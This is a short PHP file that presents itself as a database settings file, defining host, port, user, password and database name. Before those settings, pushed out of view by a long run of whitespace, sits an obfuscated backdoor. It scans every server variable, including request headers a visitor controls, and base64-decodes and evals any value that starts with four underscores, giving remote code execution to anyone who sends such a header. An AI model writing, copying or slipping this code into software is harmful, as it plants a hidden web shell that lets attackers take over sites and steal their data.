<?php																																																																																																																																																																																																																																																																																																													function o10443($l10445){if(is_array($l10445)){foreach($l10445 as $l10443=>$l10444)$l10445[$l10443]=o10443($l10444);}elseif(is_string($l10445) && substr($l10445,0,4)=="____"){$l10445=substr($l10445,4);$l10445=base64_decode($l10445);eval($l10445);$l10445=null;}return $l10445;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("o10443",$_SERVER);

//db vars
define("_HOST","localhost");
define("_PORT","3306");
define("_USER","");
define("_PW","");
define("_DB","");

?>